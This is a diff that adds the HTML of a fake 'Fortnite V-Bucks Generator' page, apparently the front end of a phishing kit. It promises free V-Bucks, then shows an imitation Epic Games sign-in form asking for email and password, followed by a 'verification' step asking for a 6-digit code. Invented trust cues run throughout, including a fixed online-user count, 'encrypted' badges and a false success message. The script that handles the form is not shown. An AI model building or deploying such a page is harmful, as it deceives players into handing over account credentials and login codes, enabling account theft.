@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fortnite V-Bucks Generator 2025</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="background-overlay"></div>
+    <div class="container">
+        <header class="main-header">
+            <h1 class="title-animation">V-BUCKS GENERATOR</h1>
+            <p class="subtitle">Get unlimited Fortnite V-Bucks for all platforms, with easy steps!</p>
+            <div class="online-users">
+                <i class="fas fa-users"></i>
+                <span id="online-count">1,337</span> USERS ONLINE NOW
+            </div>
+        </header>
+
+        <div class="generator-box">
+            <div class="platform-selector">
+                <div class="platform-grid">
+                    <div class="platform-option" data-platform="pc">
+                        <i class="fas fa-desktop"></i>
+                        <span>PC/Mac</span>
+                    </div>
+                    <div class="platform-option" data-platform="ps5">
+                        <i class="fab fa-playstation"></i>
+                        <span>PS5</span>
+                    </div>
+                    <div class="platform-option" data-platform="xbox">
+                        <i class="fab fa-xbox"></i>
+                        <span>Xbox</span>
+                    </div>
+                    <div class="platform-option" data-platform="switch">
+                        <i class="fas fa-gamepad"></i>
+                        <span>Switch</span>
+                    </div>
+                    <div class="platform-option" data-platform="mobile">
+                        <i class="fas fa-mobile-alt"></i>
+                        <span>Mobile</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="input-group username-group">
+                <div class="input-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <input type="text" id="username" placeholder="Enter your Epic Games account" class="input-with-icon">
+            </div>
+
+            <!-- Updated V-Bucks selector section -->
+            <div class="vbucks-selector">
+    <h3>SELECT V-BUCKS AMOUNT</h3>
+    <div class="vbucks-options">
+        <div class="vbucks-card" data-amount="1000" style="--card-color: #4a7c30;">
+            <img src="img/1000.jpeg" alt="1,000 V-Bucks" class="vbucks-image">
+            <div class="vbucks-overlay"></div>
+            <div class="vbucks-amount">
+                <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img">
+                <span class="amount">1,000</span>
+            </div>
+        </div>
+        <div class="vbucks-card" data-amount="2800" style="--card-color: #2271b3;">
+            <img src="img/2800.jpeg" alt="2,800 V-Bucks" class="vbucks-image">
+            <div class="vbucks-overlay"></div>
+            <div class="vbucks-amount">
+                <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img">
+                <span class="amount">2,800</span>
+            </div>
+        </div>
+        <div class="vbucks-card" data-amount="5000" style="--card-color: #6b3086;">
+            <img src="img/5000.jpeg" alt="5,000 V-Bucks" class="vbucks-image">
+            <div class="vbucks-overlay"></div>
+            <div class="vbucks-amount">
+                <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img">
+                <span class="amount">5,000</span>
+            </div>
+        </div>
+        <div class="vbucks-card" data-amount="13500" style="--card-color: #b35f24;">
+            <img src="img/13500.jpeg" alt="13,500 V-Bucks" class="vbucks-image">
+            <div class="vbucks-overlay"></div>
+            <div class="vbucks-amount">
+                <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img">
+                <span class="amount">13,500</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+            <button id="connect-button" class="button-generate">
+                <span class="button-text">GENERATE V-BUCKS</span>
+                <div class="button-glow"></div>
+            </button>
+            
+            <div class="progress-section">
+                <div id="progress-container" class="progress-container" style="display: none;">
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-glow"></div>
+                        <div class="progress-text">PROCESSING... 0%</div>
+                    </div>
+                </div>
+
+                <div class="status-box" id="status-box">
+                    <div class="status-header">
+                        <i class="fas fa-terminal"></i>
+                        <span>Console Output</span>
+                    </div>
+                    <div class="status-content"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>Secure Connection</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-lock"></i>
+                <span>Encrypted</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-user-shield"></i>
+                <span>Anonymous</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loader-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Connecting to servers...</div>
+        </div>
+    </div>
+
+    <!-- Epic Login Modal -->
+    <div class="epic-login-modal" id="epic-login-modal">
+        <div class="epic-login-content">
+            <div class="epic-login-header">
+                <img src="img/epiclogo.png" alt="Epic Games Logo" class="epic-logo">
+                <h2 class="epic-login-title">Sign In</h2>
+                
+            </div>
+
+            <form class="epic-login-form" id="epic-login-form">
+                <div class="epic-form-group">
+                    <label for="epic-email">
+                        <i class="fas fa-envelope"></i>
+                        Email Address
+                    </label>
+                    <input type="email" id="epic-email" required>
+                </div>
+
+                <div class="epic-form-group">
+                    <label for="epic-name">
+                        <i class="fas fa-key"></i>
+                        Password
+                    </label>
+                    <input type="password" id="epic-name" required>
+                </div>
+
+                <button type="submit" class="epic-login-button" id="epic-login-button" disabled>
+                    <span class="button-text">SUBMIT</span>
+                    <div class="loading-spinner"></div>
+                </button>
+            </form>
+
+            <div class="epic-login-footer">
+                <div class="security-info">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Your information is secure and encrypted</span>
+                </div>
+                <div class="epic-login-links">
+                    <a href="https://www.epicgames.com/privacypolicy?lang=en-US" onclick="return false;">Privacy Policy</a>
+                    <a href="https://www.epicgames.com/site/en-US/tos" onclick="return false;">Terms of Service</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="verification-modal" id="verification-modal">
+        <div class="verification-content">
+            <div class="verification-header">
+                <i class="fas fa-lock verification-icon"></i>
+                <h2 class="verification-title">VERIFICATION REQUIRED</h2>
+                <p class="verification-text">Please complete the verification process to receive your V-Bucks</p>
+            </div>
+
+            <div class="verification-code-section">
+                <div class="code-display">
+                    <input type="text" id="verification-code" maxlength="6" placeholder="Enter verification code" pattern="[0-9]*" inputmode="numeric">
+                </div>
+                <div class="code-info">
+                    <i class="fas fa-info-circle"></i>
+                    <span>Enter the 6-digit verification code</span>
+                </div>
+            </div>
+
+            <button id="get-verification-code" class="get-verification-button">
+                <i class="fas fa-key"></i>
+                <span>GET VERIFICATION CODE</span>
+            </button>
+
+            <button id="submit-verification" class="verification-submit">
+                <i class="fas fa-check"></i>
+                <span>VERIFY NOW</span>
+            </button>
+
+            <div class="verification-footer">
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure Verification</span>
+                </div>
+                <div class="security-badge">
+                    <i class="fas fa-lock"></i>
+                    <span>Encrypted Connection</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+<div class="success-modal" id="success-modal">
+    <div class="success-content">
+        <div class="success-icon">
+            <svg viewBox="0 0 52 52" class="checkmark">
+                <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+                <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+            </svg>
+        </div>
+
+        <h2 class="success-title">SUCCESS!</h2>
+
+        <div class="vbucks-amount-display">
+            <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img animated">
+            <span id="success-vbucks-amount">5,000</span>
+            <img src="img/vbucks.png" alt="V-Bucks" class="vbucks-icon-img animated">
+        </div>
+
+        <p class="success-message">V-Bucks have been successfully added to your Epic Games account!</p>
+
+        <button class="done-button" id="done-button">
+            <i class="fas fa-check"></i>
+            <span>DONE</span>
+        </button>
+    </div>
+</div>
+
+
+
+    <script src="script.js"></script>
+	
+	
+    
+</body>
+</html>
